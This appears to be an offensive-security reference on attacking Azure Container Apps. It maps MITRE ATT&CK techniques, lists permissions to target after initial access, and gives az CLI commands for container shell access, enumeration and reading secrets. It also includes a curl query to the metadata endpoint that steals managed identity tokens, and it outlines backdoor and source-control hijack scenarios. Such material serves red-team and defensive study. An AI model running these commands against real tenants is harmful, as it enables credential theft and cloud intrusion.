# Attack Techniques: Azure Container Apps

## Overview

Azure Container Apps is a serverless container platform for running microservices and containerized applications. From an adversary perspective, Container Apps can expose secrets, managed identity tokens, and provide command execution opportunities through exploitation of permissions and misconfigurations.

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Valid Accounts: Cloud Accounts | T1078.004 | Initial Access, Persistence, Defense Evasion |
| Command and Scripting Interpreter | T1059 | Execution |
| Unsecured Credentials | T1552 | Credential Access |
| Container Administration Command | T1609 | Execution |
| Deploy Container | T1610 | Defense Evasion, Persistence |
| Steal Application Access Token | T1528 | Credential Access |
| Cloud Service Discovery | T1526 | Discovery |
| Exfiltration Over Web Service | T1567 | Exfiltration |

---

## Key Permissions (Microsoft.App Resource Provider)

Permissions to target during enumeration after obtaining initial access:

### Container App Permissions

| Permission | Description |
|---|---|
| `microsoft.app/containerapps/read` | Get a Container App |
| `microsoft.app/containerapps/write` | Create or update a Container App |
| `microsoft.app/containerapps/delete` | Delete a Container App |
| `microsoft.app/containerapps/listsecrets/action` | List secrets of a container app |
| `microsoft.app/containerapps/getauthtoken/action` | Get auth token for Dev APIs (log stream, exec, port forward) |
| `microsoft.app/containerapps/authconfigs/read` | Get auth config of a container app |
| `microsoft.app/containerapps/authconfigs/write` | Create or update auth config of a container app |
| `microsoft.app/containerapps/authconfigs/delete` | Delete auth config of a container app |
| `microsoft.app/containerapps/revisions/read` | Get revision of a container app |
| `microsoft.app/containerapps/revisions/replicas/read` | Get replica of a container app revision |
| `microsoft.app/containerapps/sourcecontrols/write` | Create or Update Source Control Configuration |

### Container App Jobs Permissions

| Permission | Description |
|---|---|
| `microsoft.app/jobs/write` | Create or update a Container Apps Job |
| `microsoft.app/jobs/start/action` | Start a Container Apps Job |
| `microsoft.app/jobs/listsecrets/action` | List secrets of a container apps job |
| `microsoft.app/jobs/getauthtoken/action` | Get auth token for Dev APIs |

### Built-in RBAC Roles (High-Value Targets)

| Role | Risk |
|---|---|
| **ContainerApp Contributor** | Full management of Container Apps resources |
| **Contributor** | Full management including write/delete |
| **Owner** | Full management + role assignment |

> **Reference:** [Azure permissions for Compute — microsoft.app](https://learn.microsoft.com/azure/role-based-access-control/permissions/compute#microsoftapp)

---

## Command Execution

With `getauthtoken` or `exec` permission, an adversary can obtain an interactive shell inside a running container:

```bash
# Execute a shell on a container app
az containerapp exec --name <container_name> --resource-group <resource_group_name>

# Target a specific revision or replica
az containerapp exec --name <container_name> --resource-group <resource_group_name> --revision <revision_name>
az containerapp exec --name <container_name> --resource-group <resource_group_name> --replica <replica_name>

# Run a specific command non-interactively
az containerapp exec --name <container_name> --resource-group <resource_group_name> --command <command>
```

---

## Reconnaissance & Enumeration

```bash
# List all container apps in a subscription
az containerapp list --output table

# List container apps in a specific resource group
az containerapp list --resource-group <resource_group_name> --output table

# Show details of a specific container app (includes env vars, managed identity config)
az containerapp show --name <container_name> --resource-group <resource_group_name>

# List secrets
az containerapp secret list --name <container_name> --resource-group <resource_group_name>

# Show a specific secret value
az containerapp secret show --name <container_name> --resource-group <resource_group_name> --secret-name <secret_name>

# List revisions
az containerapp revision list --name <container_name> --resource-group <resource_group_name> --output table

# List replicas of a revision
az containerapp replica list --name <container_name> --resource-group <resource_group_name>

# View container app logs
az containerapp logs show --name <container_name> --resource-group <resource_group_name>
```

---

## Attack Scenarios

### 1. Secret Exfiltration via `listsecrets`
An adversary with `listsecrets/action` permission can enumerate and retrieve all secrets stored in a container app without executing inside it.

### 2. Managed Identity Token Theft
Container apps with system-assigned or user-assigned managed identities are high-value targets. From inside the container, the IMDS endpoint can be queried for tokens. These tokens can then be used to access other Azure resources:
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
```

### 3. Auth Config Manipulation
An adversary with `authconfigs/write` permission can modify or remove authentication configuration, potentially bypassing authentication for the exposed app endpoints.

### 4. Backdoor via Revision/Image Swap
With `containerapps/write`, an adversary can deploy a new revision with a modified container image containing a backdoor, allowing persistent command execution.

### 5. Source Control Hijack
With `sourcecontrols/write`, an adversary can redirect the container app's CI/CD source control to an attacker-controlled repository, enabling supply chain compromise.

---

## Microsoft Learn References
- [Azure Container Apps Overview](https://learn.microsoft.com/azure/container-apps/)
- [Microsoft.App Permissions (RBAC)](https://learn.microsoft.com/azure/role-based-access-control/permissions/compute#microsoftapp)
- [Managed Identities in Container Apps](https://learn.microsoft.com/azure/container-apps/managed-identity)
- [Authentication and Authorization in Container Apps](https://learn.microsoft.com/azure/container-apps/authentication)
- [Azure Security Baseline for Container Apps](https://learn.microsoft.com/security/benchmark/azure/baselines/azure-container-apps-security-baseline)
- [Container Apps Jobs](https://learn.microsoft.com/azure/container-apps/jobs)
